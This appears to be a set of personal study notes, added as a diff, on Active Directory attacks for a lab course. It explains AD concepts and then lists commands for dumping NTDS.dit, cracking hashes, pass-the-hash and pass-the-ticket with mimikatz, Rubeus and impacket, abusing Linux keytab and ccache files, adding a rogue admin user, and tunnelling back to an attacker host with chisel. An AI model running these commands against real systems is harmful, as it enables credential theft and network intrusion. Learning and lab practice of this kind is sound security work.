@@ -1,0 +1,262 @@
+# General
+
+#### Structure
+- Forest: collection of domains
+- Domain (tree): i.e. inlanefreight.local or freightlogistics.local
+- Subdomains: i.e. dev.inlanefreight.local or dev.freightlogistics.local
+- FQDN: Fully Qualified Domain Name. Complete name for a host. it has the hostname and domain name, i.e. `DC01.inlanefreight.local`
+- Trust Boundaries: The two domains (inlanefreight and freightlogistics) may have bidirectional trust at the root domain level, however, that doesn't mean subdomains from inlanefreight can authenticate to subdomains of freightlogistics
+- Objects: Any resource such as OUs, printers, users, domain controllers
+- Attributes: assigned characteristics of an object, such as hostnames for a computer. All attributes have an associated LDAP name that can be queried.
+- Schema: Defines what kinds of objects can exist in an AD environment.
+- GUID: Global Unique Identifier. When an object is created, a 128-bit value is assigned to it. This value is unique across the enterprise environment. The `ObjectGUID` attribute stores this value. This property never changes.
+- GPO: Group Policy Object. Collections of policy settings. A GPO has a GUID.
+- Security Principals: anything that the OS can authenticate, such as users, computer accounts, or even processes. These are AD objects.
+- Security Accounts Manager (SAM): manages local user accounts on a computer, NOT managed by AD.
+- Security Identifier (SID): unique identifier for a security principal or security group.
+- Distinguished Name (DN) describes the full path to an AD object. Ex. `cn=bjones, ou=IT, ou=Employees, dc=inlanefreight, dc=local`
+	- The user bjones (common name) works in the IT department (organizational unit) as an employee (organizational unit), on the inlanefreight.local domain.
+- Relative Distinguished Name (RDN): single component of the DN that identifies an object as unique from other objects on the same level. bjones is the RDN, and AD will not allow another bjones under the same parent container. However, two identical RDNs can exist as long as they are on different levels of organization.
+	- `cn=bjones,dc=dev,dc=inlanefreight,dc=local` is different than `cn=bjones,dc=inlanefreight,dc=local`
+- sAMAccountName: logon name. here is bjones
+- userPrincipalName: this attribute combines the RDN with the domain name, i.e. `bjones@inlanefreight.local`
+- Flexible Single Master Operation (FMSO): these roles allow DCs to continue authenticating without interruption if one of the DCs goes down.
+- 
+
+
+NTDS.dit
+- the heart of AD, stored on the DC at `C:\Windows\NTDS\` and is a database of AD information.
+- Quick way to capture with netexec
+	- `netexec smb [target] -u [user] -p [pass] --ntds`
+- Crack the hashes with `hashcat -m 1000` 
+
+Manual NTDS.dit capture:
+- `net localgroup` to check if the account has local admin rights
+- `net user [user]` to check domain privileges
+- `vssadmin` can be used to copy the C: drive so we don't bring any applications down
+	- `vssadmin Create Shadow \For=C:`
+	- copy NITD.dit - `cmd.exe /c copy [shadow copy name]\Windows\NTDS\NTDS.dit [output location]`
+
+
+
+# AD Protocols
+
+
+#### Kerberos, port 88
+- Authentication Protocol. The basis of this protocol is that the password is never transmitted over the internet.
+- Grants tickets to users that allow access. Clients will send requests that are encrypted and Kerberos will decrypt the request with the stored password for that user to determine if the request is from a valid user.
+- Client presents the TGT and gets a TGS (ticket granting service) in response. TGS is encrypted with the associated services NTLM hash. The TGS is presented to the service, which will then decrypt the TGS using the same hash.
+
+#### DNS
+- Active Directory Uses AD DS (Domain Services) to allow clients to locate Domain Controllers.
+- If authenticated on the network, you can use `nslookup [domain]` to search for the IP address (or vice versa if you provide the IP address).
+
+#### LDAP, port 389 or 636 (SSL)
+- Lightweight Directory Access Protocol
+- This is another authentication protocol for AD. Kerberos authenticates to the network, LDAP authenticates to services and directories within the network.
+
+#### MSRPC
+- Microsoft Remote Procedure Call
+- Client-server model for applications
+
+#### NTLM
+- Another authentication protocol
+- NTLM, NTLMv1, NTLMv2 are all symmetric key cryptography, one-way authentication, MD4 hashes, and are trusted by the Domain Controller.
+- Kerberos is symmetric and asymmetric, uses MD5, and is trusted by the DC and the KDC (key distribution center).
+- Hash format: `Rachel:500:aad3c435b514a4eeaad3b935b51304fe:e46b9e548fa0d122de7f59fb6d48eaa2:::`
+	- Rachel: username
+	- 500: RID (500 means administrator account)
+	- First half is the LM hash. If LM hashes are disabled on the system (default since Windows 2008), this can't be used.
+	- Second half is the NT hash. Can be cracked offline to reveal cleartext value, or, used for a PtH attack.
+- NTLMv1 can NOT be used for PTH
+- NTLMv1 example: `u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c`
+- NTLMv2 example: `admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030`
+
+#### MSCache2
+- An offline storage of Domain Cached Credentials (DCC) to solve the issue of a network outage (meaning that Kerberos is no longer available).
+- Hosts save the last 10 hashes for any domain users that successfully logged into the machine.
+- Stored in `HKEY_LOCAL_MACHINE\SECURITY\Cache`
+- Cannot be used in PTH
+- Format `$DCC2$10240#bjones#e4e938d12fe5974dc42a90120bd9c90f`
+
+
+# Pass the Hash
+Some of these techniques are very useful for pivoting within a network. Pay close attention to the IP address and domain you are using (and which device the hashes are for )
+
+NTLM hashed stored on the DC are not salted and can be passed
+- Once you log in as a user to one of the machines, enter `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` to disable restricted admin mode. 
+- Then you can PTH with RDP. This will be necessary to open multiple command prompts and continuing to PTH to elevate permissions.
+
+RDP
+- `xfreerdp  /v:[IP] /u:[user] /pth:[hash]`
+- See note at the top about disabling restricted admin mode to use RDP
+
+Impacket
+- `impacket-psexec [user]@[IP] -hashes [LM]:[NT]` opens a shell
+	- if you only have `NT` hash for example, try `:[hash]`
+
+Evil-winrm
+- Useful if you don't have admin rights
+- `evil-winrm -i [IP] -u [user] -H [hash]`
+	- opens a shell
+
+Netexec
+- `netexec [protocol] [IP] -u [user] -d . -H [hash] -x [command]`
+	- executes specified command
+- `netexec [protocol] [IP/subnet] -u [user] -d . -H [hash] --local-auth`
+	- adding `local-auth` will automatically try to authenticate to each host on the specified subnet with those credentials (useful if you found an Administrator hash)
+
+Mimikatz
+- `sekurlsa::pth` is a module to perform PtH
+- on windows: `mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:[hash] /domain:inlanefreight.htb /run:cmd.exe" exit`
+	- Allows you to use cmd.exe to execute commands as that user
+	- use `/domain:localhost` to execute a cmd on local machine
+	- specify another domain to try and connect to a Domain Controller or something
+
+Powershell
+- `Invoke-TheHash` https://github.com/Kevin-Robertson/Invoke-TheHash
+	- You have to download the files onto the target, and import them into powershell with `Import-Module ./Invoke-TheHash.psd1` etc.
+	- you need the target user to have admin rights (current user doesn't need those rights)
+	- `Invoke-SMBExec -Target [IP] -Domain [domain] -Username [user] -Hash [hash] -Command "[command]"`
+		-  You can also use this process to open a reverse shell by replacing the `-Command` with a PowerShell #3 payload from reverse shell generator
+		- You can use the local target and try to connect to the Domain Controller or other machines by specifying the target and domain for it
+	- `Invoke-SMBExec -Target [IP] -Domain [domain] -Username [user] -Hash [hash] -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose`
+		- This command creates a new user named Mark and adds them to the admin group (we didn't get to log in as the person whose hash we had, we simply passed the hash and borrowed their rights for a process)
+
+
+# Kerberoasting
+
+## Export Kerberos Tickets
+
+Instead of an NTLM hash, you can use a stolen Kerberos ticket.
+
+If you get local administrator access, you can steal tickets stored by LSASS.
+
+Tickets ending with $ correspond to the computer account. Tickets that have @ represent the user's name, service name, and domain name.
+
+Mimikatz command usage
+- `mimikatz.exe` -> `privilege::debug` -> `sekurlsa::tickets /export`
+- these may not work anymore? wrong encryption type exported from Mimikatz?
+
+Rubeus
+- `Rubeus.exe dump /nowrap`
+
+## Pass the Key (OverPass the Hash) (Forges a new TGT)
+Converts a hash/key into a TGT. This is helpful when you have cleartext or hashed user password but need Kerberos authentication to access something.
+
+Traditional PTH doesn't touch kerberos. Pass the Key or OverPass The Hash converts a hash/key into a Ticket-Granting-Ticket (TGT)
+
+First use Mimikatz to extract user's hash:
+- `mimikatz.exe` -> `privilege::debug` -> `sekurlsa::ekeys`
+
+OverPass with Mimikatz (admin rights required)
+- `mimikatz.exe` -> `privilege::debug` -> `sekurlsa::pth /domain: /user: /ntlm:`
+
+OverPass with Rubeus (admin rights NOT required)
+- can use rc4, aes128, aes256, or des
+- `Rubeus.exe asktgt /domain: /user: /[type]: /nowrap`
+- `[type]` example might be something like `/aes256:`
+
+
+## Pass the Ticket
+
+Mimikatz
+- `mimikatz.exe` -> `privilege::debug` -> `kerberos::ptt "[path to .kirbi file]"`
+- this doesn't really return anything, it just adds the ticket for you so you can access other resources that it grants
+
+Opening a remote PS shell with PTT
+- you can run PS scripts on remote computers, you need administrative permissions to do so (or, user can be in the Remote Management Users group)
+- Conduct a PTT attack with the mimikatz or Rubeus instructions first
+- Use the ticket to start a session from cmd:
+	- `powershell` -> `Enter-PSSession -ComputerName [name]`
+	- Assuming we imported a ticket that gave us access to the named computer/DC, this will open a remote PS shell on that device
+
+Rubeus
+- `Rubeus.exe asktgt /domain: /user: /[type] /ptt`
+	- `[type]` would be hash type such as `/rc4:`
+- Use a `.kirbi` ticket exported from mimikatz.exe (see `Export Kerberos Tickets`)
+	- `Rubeus.exe ptt /ticket:[value]` 
+	- `[value]` is from mimikatz output. Example:
+	- `/ticket:[0;6c680]-2-0-40e10000-user@domain.kirbi`
+- OR convert `.kirbi` ticket to a base64 string
+	- Powershell `[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))`
+	- Once you get the base64 string: `Rubeus.exe ptt /ticket:[string]`
+- To PTT to another remote host and open PowerShell:
+	- `Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show`
+	- this will open a new cmd window, and we can execute Rubeus again in that window to request a new TGT with the `/ptt` option to import the ticket from our current session to the DC or target machine:
+	- `Rubeus.exe asktgt /user: /domain: /[hash value]` -> `powershell` -> `Enter-PSSession -ComputerName [name]`
+
+## Pass the Ticket (Linux)
+
+### If there is a Linux machine in the domain:
+
+keytab files and `ccache` files are two ways Linux machines store and use Kerberos credentials
+- When you discover their owners, check the owner's domain permissions with `id [user@domain]` to see if they have Domain Admin permissions
+
+Use `realm list` on the Linux machine to identify the domain it is joined to
+	- if `realm` is not available, you can check for `sssd` and `winbind` in the running services
+	- `ps -ef | grep -i "winbind"`
+	- `crontab -l` and search for the word `kinit` to indicate Kerberos activity
+
+Finding ccache files
+- `ccache` files in Linux are usually stored in `/tmp` and in the environment variable `KRB5CCNAME`.
+	- `env | grep -i krb5` 
+	- view the permissions for them after you discover them
+
+Abusing ccache files
+- navigate to root directory on target machine (as root)
+- `cp [ccache file] .`
+- `export KRB5CCNAME=[path to ccache copy]`
+- `klist` to check permissions.
+- `smbclient //[domain controller]/[directory] -k -c ls -no-pass`
+
+Finding keytab files
+- Search for files with the word `keytab`
+	- `find / -name *keytab* -ls 2>/dev/null`
+
+Abusing KeyTab (krb5) Files
+- You can impersonate a user by discovering KeyTab files
+- `klist -k -t [path to keytab]`
+- use `klist` again to confirm your access
+- use `smbclient` or something to access their files
+-  `python3 keytabextract.py [.keytab file]`
+	- will extract NTLM hashes that can be used for PTH
+
+Linikatz
+- download from github
+- execute
+
+### Attacking from your linux machine
+
+This uses `chisel`, `proxychains`, `impacket`, and an example with `evil-winrm` 
+
+If you want to use Linux attack tools from your host machine, you need to proxy your traffic through the machine that gave you access. This example connects to `ms01`
+- edit the `etc/hosts` file and add the LOCAL IP addresses of the access machine and the target domain controller. Also add the domain names
+	- ex. `172.16.1.5  ms01.inlanefreight.htb ms01`
+	- `172.16.1.10  inlanefreight.htb dc01.inlanefreight.htb dc01`
+- modify the proxychain config to use socks5 and port 1080
+	- `cat /etc/proxychains.conf`
+	- should have the line `socks5 127.0.0.1 1080`
+- Download chisel (github .gz file from releases)
+	- `sudo ./chisel server --reverse`
+	- connect to target with RDP, make sure it has chisel downloaded
+		- `xfreerdp /v:[target] /u:[user] /d:inlanefreight.htb /p:[pass] /dynamic-resolution`
+	- execute chisel on target and connect back to attacking machine
+	- `c:\tools\chisel.exe client [IP]:[port] R:socks`
+- Transfer files you need, such as a keytab from a Linux machine on the network, through proxy machine (`ms01`)
+
+Impacket via proxychain
+- Use the ticket you transferred with `impacket` and `proxychains` (compatible with a proxychain setup)
+- Set the ticket to the `KRB5CCNAME` environment variable
+	- some implementations of AD use the `FILE:` prefix in the file path when setting this variable, meaning the path for the variable needs to only include the path to the ccache file (not the file name at the end)
+- `proxychains impacket-wmiexec [DC hostname] -k`
+
+
+Evil-WinRM via a proxychain
+- edit the `/etc/krb5.conf` file to change the `default_realm` and `kdc`
+	- default_realm is the domain (`inlanefreight.htb`)
+	- KDC is the controller address (`dc01.inlanefreight.htb`)
+- `proxychains evil-winrm -i dc01 -r inlanefreight.htb`
+
+Additionally, you can convert `ccache` (linux) to `kirbi` (windows) with `impacket`
+- `impacket-ticketConverter [ccache file] [kirbi output]`
